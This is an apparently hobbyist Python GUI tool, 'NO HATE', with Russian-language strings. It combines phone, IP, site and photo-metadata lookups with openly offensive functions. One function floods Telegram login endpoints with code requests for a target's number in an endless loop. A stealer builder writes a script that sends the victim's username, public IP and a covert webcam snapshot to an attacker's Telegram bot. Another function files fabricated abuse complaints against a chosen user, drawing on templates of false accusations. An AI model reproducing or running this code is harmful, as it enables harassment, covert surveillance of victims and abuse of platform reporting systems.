import customtkinter
from PIL import Image
from PIL.ExifTags import TAGS
from bs4 import BeautifulSoup
from socket import gethostbyname
import fake_useragent
import webbrowser
import threading
import requests
import mutagen
import random
import string
import random
import base64
import time
import json
import os

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Connection': 'keep-alive',
    'Cookie': '__ddg1=KH749fj0Mh86fjwF; __ddg2=KH749fj0Mh86fjwF; _ym_uid=16463246825906840; _ym_d=1646324682; _ym_isad=1; _ym_visorc=w; _ga=GA1.2.1812100311.1646324683; _gid=GA1.2.1114254218.1646324683; _gat=1; _ym_isad=1; PHPSESSID=2159a9a41c763853f27c336f9b0951b1; _ym_visorc_42790243=w; _ym_visorc_18369385=w; _ym_visorc_16615425=w; _ym_visorc_42531933=w',
    'Upgrade-Insecure-Requests': '1'
}
base_phone = {}
base_ip = {}
base_site = {}
base_auto = {}
base_photo = {}

def generate_phone_number():
    # Updated phone number generation logic
    template = "+7**********"
    return ''.join(random.choice('0123456789') if char == '*' else char for char in template)

def generate_email():
    domains = ["gmail.com", "rambler.ru", "yahoo.com", "mail.ru"]
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_complaint(username, violation):
    return random.choice(violations[violation][1]).format(username=username)

violations = {
    1: ['Спам', [
        'Уважаемая служба поддержки, пользователь {username} активно занимается спамом. Примите меры.',
        'Пользователь {username} нарушает правила, рассылка спама. Прошу принять меры.',
        'Аккаунт {username} занимается спамом в чатах Telegram. Просьба принять меры.',
        'Пользователь {username} отправляет спам-сообщения в чатах. Пожалуйста, разберитесь.',
        'Заметил, что {username} занимается рассылкой спама. Прошу принять меры.',
        'Пользователь {username} спамит в чатах Telegram. Требуются меры.'
    ]],
    2: ['Мошенничество', [
        'Обратите внимание на {username}, подозревается в мошенничестве. Проверьте его действия.',
        'Пользователь {username} участвует в мошеннических схемах. Просьба принять меры.',
        'Уважаемая служба поддержки, {username} занимается мошенничеством. Требуются меры.',
        'Пользователь {username} замечен в мошенничестве. Прошу проверить.',
        'Прошу обратить внимание на {username}, возможное мошенничество. Необходимо вмешательство.',
        'Пользователь {username} подозревается в мошеннических действиях. Проверьте.'
    ]],
    3: ['Порнография', [
        'Уважаемая служба поддержки, {username} распространяет порнографию. Примите меры.',
        'Пользователь {username} нарушает правила, распространение порнографии. Прошу принять меры.',
        'Аккаунт {username} распространяет порнографический контент. Просьба принять меры.',
        'Пользователь {username} размещает порнографические материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет порнографию. Прошу принять меры.',
        'Пользователь {username} распространяет порнографию в чатах Telegram. Требуются меры.'
    ]],
    4: ['Нарушение правил', [
        'Уважаемая служба поддержки, {username} нарушает правила платформы. Примите меры.',
        'Пользователь {username} систематически нарушает правила. Прошу принять меры.',
        'Аккаунт {username} нарушает установленные правила. Просьба принять меры.',
        'Пользователь {username} нарушает правила поведения. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает правила. Прошу принять меры.',
        'Пользователь {username} нарушает правила Telegram. Требуются меры.'
    ]],
    5: ['Оскорбления', [
        'Уважаемая служба поддержки, {username} оскорбляет пользователей. Примите меры.',
        'Пользователь {username} ведет себя агрессивно и оскорбляет других. Прошу принять меры.',
        'Аккаунт {username} оскорбляет участников чатов. Просьба принять меры.',
        'Пользователь {username} распространяет оскорбительные сообщения. Пожалуйста, разберитесь.',
        'Заметил, что {username} оскорбляет других участников. Прошу принять меры.',
        'Пользователь {username} ведет себя оскорбительно в чатах Telegram. Требуются меры.'
    ]],
    6: ['Нарушение авторских прав', [
        'Уважаемая служба поддержки, {username} нарушает авторские права. Примите меры.',
        'Пользователь {username} размещает контент без разрешения. Прошу принять меры.',
        'Аккаунт {username} систематически нарушает авторские права. Просьба принять меры.',
        'Пользователь {username} размещает защищенные материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает авторские права. Прошу принять меры.',
        'Пользователь {username} нарушает авторские права в чатах Telegram. Требуются меры.'
    ]],
    7: ['Пропаганда насилия', [
        'Уважаемая служба поддержки, {username} распространяет материалы с насилием. Примите меры.',
        'Пользователь {username} пропагандирует насилие. Прошу принять меры.',
        'Аккаунт {username} размещает материалы с насилием. Просьба принять меры.',
        'Пользователь {username} пропагандирует насилие. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет насильственные материалы. Прошу принять меры.',
        'Пользователь {username} пропагандирует насилие в чатах Telegram. Требуются меры.'
    ]],
    8: ['Пропаганда наркотиков', [
        'Уважаемая служба поддержки, {username} пропагандирует наркотики. Примите меры.',
        'Пользователь {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Аккаунт {username} занимается пропагандой наркотиков. Просьба принять меры.',
        'Пользователь {username} пропагандирует наркотики. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Пользователь {username} пропагандирует наркотики в чатах Telegram. Требуются меры.'
    ]],
    9: ['Терроризм', [
        'Уважаемая служба поддержки, {username} связан с терроризмом. Примите меры.',
        'Пользователь {username} подозревается в терроризме. Прошу принять меры.',
        'Аккаунт {username} связан с террористическими действиями. Просьба принять меры.',
        'Пользователь {username} распространяет террористические материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} может быть причастен к терроризму. Прошу принять меры.',
        'Пользователь {username} подозревается в террористической деятельности. Требуются меры.'
    ]],
    10: ['Фейковые новости', [
        'Уважаемая служба поддержки, {username} распространяет фейковые новости. Примите меры.',
        'Пользователь {username} занимается дезинформацией. Прошу принять меры.',
        'Аккаунт {username} распространяет ложные сведения. Просьба принять меры.',
        'Пользователь {username} распространяет фейки. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет фейковые новости. Прошу принять меры.',
        'Пользователь {username} занимается дезинформацией в чатах Telegram. Требуются меры.'
    ]],
    11: ['Нарушение конфиденциальности', [
        'Уважаемая служба поддержки, {username} нарушает конфиденциальность. Примите меры.',
        'Пользователь {username} распространяет личные данные. Прошу принять меры.',
        'Аккаунт {username} нарушает правила конфиденциальности. Просьба принять меры.',
        'Пользователь {username} нарушает конфиденциальность. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает конфиденциальность. Прошу принять меры.',
        'Пользователь {username} распространяет личные данные в чатах Telegram. Требуются меры.'
    ]],
    12: ['Хакерство', [
        'Уважаемая служба поддержки, {username} занимается хакерством. Примите меры.',
        'Пользователь {username} подозревается в хакерстве. Прошу принять меры.',
        'Аккаунт {username} занимается хакерской деятельностью. Просьба принять меры.',
        'Пользователь {username} подозревается в хакерской деятельности. Пожалуйста, разберитесь.',
        'Заметил, что {username} занимается хакерством. Прошу принять меры.',
        'Пользователь {username} занимается хакерством в чатах Telegram. Требуются меры.'
    ]]
}

#function's
def search_phone(phone: str):
    ephone = phone[1:]
    url = f"https://fincalculator.ru/api/tel/{phone}"
    mnp = f"https://xn----dtbofgvdd5ah.xn--p1ai/php/mnp.php?nomer={phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    mnp_rep = requests.get(mnp, headers={'User-Agent': user_agent})
    data = json.loads(response.text)

    oper = data["operator"] if data["operator"] != "" else "Не найдено"
    if mnp_rep.text != "﻿no":
        oper = oper + " был перенесён на " + mnp_rep.text

    base = {
        "Query": phone,
        "Country": data["country"] if data["country"] != "" else "Не найдено",
        "Region": data["region"] if data["region"] != "" else "Не найдено",
        "Oper": oper
    }

    global base_phone
    base_phone = base

    return base

def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()

    base = {
        "Query": ip,
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "City": data.get('city', "Не найдено"),
        "Org": data.get('org', "Не найдено"),
    }

    global base_ip
    base_ip = base

    return base

def info_site(domen: str):
    ip = gethostbyname(domen.split('/')[2]) if '/' in domen else gethostbyname(domen)

    base = {
        "Query": domen,
        "IP": ip
    }

    global base_site
    base_site = base

    return base

def info_photo(path: str):
    tags_to_retrieve=['Model', 'DateTime']

    dataMODEL = "None"
    dataDT = "None"

    image = Image.open(path)
    exifdata = image.getexif()

    metadata = {}
    for tag_id, value in exifdata.items():
        tag = TAGS.get(tag_id, tag_id)
        if tags_to_retrieve is None or tag in tags_to_retrieve:
            if isinstance(value, bytes):
                value = value.decode()
            metadata[tag] = value

    for tag, value in metadata.items():
        if tag == "Model":
            dataMODEL = value

        if tag == "DateTime":
            dataDT = value

    base = {
        "Query": path,
        "Device": dataMODEL,
        "Date-Time": dataDT
    }

    global base_photo
    base_photo = base

    return base

def spam_tg(phone: str):
    urls = [
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F',
        'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F'
    ]

    while True:
        for url in urls:
            user = fake_useragent.UserAgent().random
            headers = {'user-agent': user}

            requests.post(url, headers=headers, data={'phone': phone})
            time.sleep(0.5)

def stealler_build(token: str):
    code = f"""
    from telebot import types
    import requests
    import telebot
    import cv2
    import os

    bot = telebot.TeleBot('{token}')

    def get_public_ip():
        try:
            response = requests.get("https://api64.ipify.org?format=json")
            response.raise_for_status()
            return response.json()["ip"]
        except Exception as e:
            return "Не удалось получить IP"

    @bot.message_handler(commands=['start'])
    def start_command(message):
        bot.send_message(message.chat.id, f"Name: {os.getlogin()}\nIP: {get_public_ip()}")
        try:
            filename = "cam.jpg"
            cap = cv2.VideoCapture(0)

            for i in range(30):
                cap.read()

            ret, frame = cap.read()

            cv2.imwrite(filename, frame)
            cap.release()

            with open(filename, "rb") as img:
                bot.send_photo(message.chat.id, img)

            os.remove(filename)
        except:
            bot.send_message(message.chat.id, f"[ERROR] webcam not found")

    bot.polling()
    """

    with open('stealer.py', 'w') as file:
        file.write(code)

def snos_tg(nickname: str):
    user = fake_useragent.UserAgent().random
    url = "https://telegram.org/support"
    headers = {'content-type': 'application/json', 'User-Agent': user}
    phone = generate_phone_number()
    email = generate_email()
    complaint = generate_complaint(nickname, 1)

    data = {
        'complaint': complaint,
        'support_problem': complaint,
        'support_phone': phone,
        'support_email': email
    }

    response = requests.post(url, headers=headers, json=data)

#Menu
def phone():
    phone = customtkinter.CTk()
    phone.geometry("340x350")
    phone.title("NO HATE | INFO BY PHONE")

    def clear():
        global base_phone
        base_phone = None
        phone.destroy()

    phone.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=phone, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=phone, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = search_phone(entry.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nОператор: {info["Oper"]}')

    button = customtkinter.CTkButton(master=phone, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    phone.mainloop()



def ip():
    ip = customtkinter.CTk()
    ip.geometry("340x350")
    ip.title("NO HATE | INFO BY IP")

    def clear():
        global base_ip
        base_ip = None
        ip.destroy()

    ip.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=ip, placeholder_text="IP...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=ip, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = search_ip(entry.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nГород: {info["City"]} \nПровайдер: {info["Org"]}')

    button = customtkinter.CTkButton(master=ip, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    ip.mainloop()

def site():
    site = customtkinter.CTk()
    site.geometry("340x350")
    site.title("NO HATE | INFO BY SITE")

    def clear():
        global base_site
        base_site = None
        site.destroy()

    site.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=site, placeholder_text="example.com...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=site, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = info_site(entry.get())
        textbox.insert(f"0.0", f'IP: {info["IP"]}')

    button = customtkinter.CTkButton(master=site, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    site.mainloop()

def photo():
    photo = customtkinter.CTk()
    photo.geometry("340x350")
    photo.title("NO HATE | INFO BY PHOTO")

    def clear():
        global base_photo
        base_photo = None
        photo.destroy()

    photo.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=photo, placeholder_text="Photo path...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=photo, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = info_photo(entry.get())
        textbox.insert(f"0.0", f'Устройство: {info["Device"]} \nДата и время: {info["Date-Time"]}')

    button = customtkinter.CTkButton(master=photo, text="Get MetaData", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    photo.mainloop()

def tg():
    spam = customtkinter.CTk()
    spam.geometry("400x300")
    spam.title("NO HATE | TELEGRAM SPAMMER")

    entry = customtkinter.CTkEntry(master=spam, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=200, y=110, anchor=customtkinter.CENTER)

    def one():
        spam_tg(entry.get())

    button = customtkinter.CTkButton(master=spam, text="Apply", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)

    spam.mainloop()

def stealler():
    st = customtkinter.CTk()
    st.geometry("400x300")
    st.title("NO HATE | STEALLER BUILDER")

    entry = customtkinter.CTkEntry(master=st, placeholder_text="00000:ABCDEFGHI...")
    entry.place(x=200, y=110, anchor=customtkinter.CENTER)

    def one():
        pass

    button = customtkinter.CTkButton(master=st, text="Build", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)

    st.mainloop()

def report():
    html = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
        <title>NO_HATE | Report</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

        <svg style="display:none;">
            <symbol id="logo-icon" viewBox="0 0 24 24">
                <path d="M12 0C8.27 0 5.14 2.55 4.25 6c-.07.3-.12.61-.15.93A9.08 9.08 0 0 0 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.3A7.902 7.902 0 0 1 12 20zm6.31-3.1L7.1 5.69A7.902 7.902 0 0 1 12 4c4.41 0 8 3.59 8 8 0 1.85-.63 3.55-1.69 4.9z"/>
            </symbol>
            <symbol id="copy-icon" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></symbol>
            <symbol id="arrow-up" viewBox="0 0 24 24"><path fill="currentColor" d="M13 20h-2V8.83L8.41 11.4 7 10l5-5 5 5-1.41 1.4L13 8.83V20z"/></symbol>
        </svg>

        <style>
            :root {
                --primary: #6366f1;
                --secondary: #8b5cf6;
                --accent: #ec4899;
                --background: #0f172a;
                --surface: #1e293b;
                --text: #f8fafc;
                --text-secondary: #94a3b8;
            }

            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            body {
                font-family: 'Inter', system-ui, -apple-system, sans-serif;
                background: var(--background);
                color: var(--text);
                line-height: 1.5;
                padding: 1rem;
                min-height: 100vh;
            }

            .container {
                max-width: 1200px;
                margin: 0 auto;
                position: relative;
                padding-bottom: 2rem;
            }

            .corner-logo {
                position: absolute;
                top: 1rem;
                right: 1rem;
                display: flex;
                align-items: center;
                gap: 0.5rem;
                color: var(--text);
                text-decoration: none;
                z-index: 100;
            }

            .logo-icon {
                width: 32px;
                height: 32px;
                fill: currentColor;
                transition: transform 0.2s;
            }

            .logo-text {
                font-weight: 700;
                font-size: 1.25rem;
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }

            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 1.5rem;
                margin: 2rem 0;
            }

            .stat-card {
                background: var(--surface);
                padding: 1.5rem;
                border-radius: 1rem;
                border-left: 4px solid var(--primary);
                box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
            }

            .leak-card {
                background: var(--surface);
                border-radius: 1rem;
                padding: 1.5rem;
                margin-bottom: 1.5rem;
                border: 1px solid rgba(255,255,255,0.1);
                transition: transform 0.2s;
            }

            .leak-card:hover {
                transform: translateY(-2px);
            }

            .leak-header {
                display: flex;
                align-items: center;
                gap: 1rem;
                margin-bottom: 1.5rem;
            }

            .source-badge {
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                color: white;
                padding: 0.25rem 0.75rem;
                border-radius: 0.5rem;
                font-size: 0.875rem;
                font-weight: 500;
            }

            .data-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
                gap: 1rem;
            }

            .data-item {
                background: rgba(255,255,255,0.05);
                padding: 1rem;
                border-radius: 0.75rem;
                position: relative;
                overflow: hidden;
            }

            .copy-btn:hover {
                background: var(--primary);
                box-shadow: 0 2px 8px -1px var(--primary);
            }

            .scroll-top {
                position: fixed;
                bottom: -60px;
                right: 20px;
                width: 44px;
                height: 44px;
                background: var(--primary);
                color: white;
                border: none;
                border-radius: 50%;
                cursor: pointer;
                opacity: 0;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 4px 12px rgba(99, 102, 241, 0.25);
                z-index: 1000;
            }

            .scroll-top.visible {
                bottom: 20px;
                opacity: 1;
            }

            .scroll-top:hover {
                transform: translateY(-2px) scale(1.05);
                background: var(--secondary);
            }

            @media (max-width: 768px) {
                .container {
                    padding: 0 0.5rem;
                }

                .leak-header {
                    flex-wrap: wrap;
                }

                .data-grid {
                    grid-template-columns: 1fr;
                }

                .corner-logo {
                    position: static;
                    justify-content: center;
                    margin-bottom: 1.5rem;
                }

                .scroll-top {
                    right: 10px;
                    bottom: -60px;
                    width: 40px;
                    height: 40px;
                }

                .scroll-top.visible {
                    bottom: 70px;
                }
            }

            .fade-in {
                animation: fadeIn 0.3s ease-in;
            }

            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(10px); }
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
    </head>
    <body>
    """

    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY PHONE  |  Запрос: {base_phone["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌏Страна
                    </div>
                    <div style="word-break: break-word;">{base_phone["Country"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌲Регион
                    </div>
                    <div style="word-break: break-word;">{base_phone["Region"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    👤Оператор
                    </div>
                    <div style="word-break: break-word;">{base_phone["Oper"]}</div>
                </div>
            </div>
        </div>
        </div></div>"""
    except:
        pass

    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY IP  |  Запрос: {base_ip["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌏Страна
                    </div>
                    <div style="word-break: break-word;">{base_ip["Country"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌲Регион
                    </div>
                    <div style="word-break: break-word;">{base_ip["Region"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🏘Город
                    </div>
                    <div style="word-break: break-word;">{base_ip["City"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    👤Провайдер
                    </div>
                    <div style="word-break: break-word;">{base_ip["Org"]}</div>
                    </div>
                </div>
            </div>
        </div></div>
        """
    except:
        pass

    try:
        html += f"""
        <div class="leak-card fade-in">
        <div class="leak-header">
            <span class="source-badge">INFO BY SITE  |  Запрос: {base_site["Query"]}</span>
        </div>
            <div class="data-grid">
                <div class="data-item">
                    <div style="margin-bottom: 0.5rem;">
                        <div style="color: var(--text-secondary); font-size: 0.875rem;">
                        🌐IP
                        </div>
                        <div style="word-break: break-word;">{base_site["IP"]}</div>
                        </div>
                    </div>
                </div>
                </div></div>
         """
    except:
        pass

    try:
        html += fr"""
        <div class="leak-card fade-in">
        <div class="leak-header">
            <span class="source-badge">MetaData by Photo  |  Запрос: {base_photo["Query"]}</span>
        </div>
            <div class="data-grid">
                <div class="data-item">
                    <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    📱Устройство
                    </div>
                    <div style="word-break: break-word;">{base_photo["Device"]}</div>

                    <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🕗Дата и время
                    </div>
                    <div style="word-break: break-word;">{base_photo["Date-Time"]}</div>
                </div>
            </div>
        </div>
        </div></div>
        """
    except:
        pass

    html += """
        <button class="scroll-top" aria-label="Прокрутить вверх">
            <svg style="width:24px;height:24px;"><use href="#arrow-up"/></svg>
        </button>
            <script>
                // Скрипт для кнопки прокрутки
                const scrollBtn = document.querySelector('.scroll-top');

                window.addEventListener('scroll', () => {
                        if (window.scrollY > 500) {
                            scrollBtn.classList.add('visible');
                        } else {
                            scrollBtn.classList.remove('visible');
                        }
                    });

                    scrollBtn.addEventListener('click', () => {
                        window.scrollTo({
                            top: 0,
                            behavior: 'smooth'
                        });
                    });

                    // Адаптация для мобильных устройств
                    function updateVH() {
                        document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
                    }
                    updateVH();
                    window.addEventListener('resize', updateVH);
                    </script>
                </body>
            </html>
            """
    with open('report.html', 'w', encoding='utf-8') as file:
        file.write(html)

    webbrowser.open('report.html')

customtkinter.set_appearance_mode("dark")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("dark-blue")  # Themes: "blue" (standard), "green", "dark-blue"

app = customtkinter.CTk()
app.geometry("400x480")
app.title("NO HATE | TOOL")

label = customtkinter.CTkLabel(app, text="Osint", fg_color="transparent")
label.place(x=200, y=80, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search By Phone", command=phone)
button.place(x=200, y=110, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search By IP", command=ip)
button.place(x=200, y=140, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search by Site", command=site)
button.place(x=200, y=170, anchor=customtkinter.CENTER)

label = customtkinter.CTkLabel(app, text="Tools", fg_color="transparent")
label.place(x=200, y=210, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="MD by Photo", command=photo)
button.place(x=200, y=240, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Spam TG", command=tg)
button.place(x=200, y=270, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Stealler", command=stealler)
button.place(x=200, y=300, anchor=customtkinter.CENTER)

label = customtkinter.CTkLabel(app, text="Settings", fg_color="transparent")
label.place(x=200, y=340, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Create report", command=report)
button.place(x=200, y=370, anchor=customtkinter.CENTER)
app.mainloop()
